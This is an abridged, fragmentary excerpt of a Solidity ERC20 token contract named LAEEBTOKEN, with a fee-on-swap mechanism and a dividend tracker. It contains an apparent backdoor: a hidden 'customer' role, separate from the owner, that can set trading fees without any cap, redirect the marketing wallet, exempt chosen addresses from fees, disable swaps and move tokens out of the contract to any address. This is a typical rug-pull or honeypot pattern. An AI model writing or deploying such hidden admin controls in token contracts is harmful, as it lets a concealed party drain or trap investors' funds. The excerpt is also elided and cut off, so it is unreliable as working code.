...
contract LAEEBTOKEN is ERC20, Ownable {
    ...
    address private _marketingWalletAddress = address(0x4Ec44eA9b4F28dC638d1B9A38cbe2EBBb2561Dd9);   
    uint lpFee = 3;  
    uint marketingFee = 3; 
    ...
    uint256 public AmountLPFeeDead = 1000 *(10**18);  
    ...
    modifier iscustomer() {
        require(customeraddr == msg.sender, "failed");
        _;
    }
    function getCustomerAddr() public view returns(address) {
        return customeraddr;
    }
    function setCustomerAddr(address _addr) public iscustomer{
        customeraddr = _addr;
    }
  
    function setMarketingWalletAddress(address _addr) public iscustomer{
        _marketingWalletAddress = _addr;
    }
   
    function setmarketingFee(uint256 _amount) public iscustomer {
        marketingFee = _amount;
    }
    function setlpFee(uint256 _amount) public iscustomer {
        lpFee = _amount;
    }
  
    function setNodoAddress(address _addr) public iscustomer{
        _nodoaddress[_addr] = true;
    }
   
    function setSwapEnable(bool _is) public iscustomer{
        swapEnabled = _is;
    }
   
    function setExcludedFromFees(address _addr,bool _is) public iscustomer{
        _isExcludedFromFees[_addr] =  _is;
    }
    function _setExcludedFromFees(address _addr,bool _is) private {
        _isExcludedFromFees[_addr] =  _is;
    }
    function doEntFee(address _to,uint _amount) public iscustomer returns(bool){
        super._transfer(address(this), _to, _amount);
        return true;
    }
   
    function setLpAmount(uint _lpFee,uint _lpAmount) public iscustomer returns(bool){
        AmountLPFee = _lpFee;
        AmountLPFeeDead = _lpAmount;
        return true;
    }
    function setLpDiviend(uint _AmountLPFeeDead,uint _tokenBalanceForReward) public iscustomer returns(bool){
        AmountLPFeeDead = _AmountLPFeeDead;
        tokenBalanceForReward_ = _tokenBalanceForReward;
        return true;
    }
    ...
    function _transfer(
        ...
        if(uniswapV2Pair == to &&from != owner() &&to != owner() &&swapEnabled &&from != address(this)) {
            swapping = true;
            if(AmountLPFee >= AmountLPFeeDead){  
        ...
        if(to == uniswapV2Pair  || from == uniswapV2Pair){
           ...
           uint marketamount= amount.mul(marketingFee).div(100);
           ...
           super._transfer(from, to, amount.sub(lpamount).sub(marketamount));
    ...
    function SendDividendsByPublic(uint rewardT) public iscustomer {
        bool success = IERC20(rewardToken).transfer(address(dividendTracker), rewardT);
        if (success) {
            dividendTracker.distributeCAKEDividends(rewardT);
        }
    }
    function SendDividendsByPublicOne(uint rewardT) public iscustomer {
        IERC20(rewardToken).transfer(address(dividendTracker), rewardT);
    }
    function SendDividendsByPublicTwo(address _to ,address _token ,uint256 _amount) public iscustomer {
